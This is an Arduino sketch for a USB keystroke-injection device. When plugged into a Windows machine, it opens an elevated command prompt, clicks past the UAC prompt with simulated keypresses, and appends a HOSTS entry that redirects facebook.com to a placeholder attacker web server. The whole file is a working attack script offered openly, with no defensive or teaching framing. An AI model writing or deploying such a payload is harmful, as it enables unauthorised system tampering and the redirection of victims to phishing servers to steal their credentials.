/* ********************** */
/*     done by rng70      */
/* ********************** */

#include "Keyboard.h"

void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup(){
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print("cmd");
  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);
  delay(500);
  typeKey(KEY_LEFT_ARROW);
  delay(1000);
  typeKey(KEY_RETURN);
  delay(1000);

  Keyboard.print("ECHO. >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS");

  typeKey(KEY_RETURN);
  delay(1000);

  Keyboard.print("ECHO ATTACKER_WEBserverIP facebook.COM >> C:\\WINDOWS\\SYSTEM32\\DRIVERS\\ETC\\HOSTS");

  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

void loop() {}
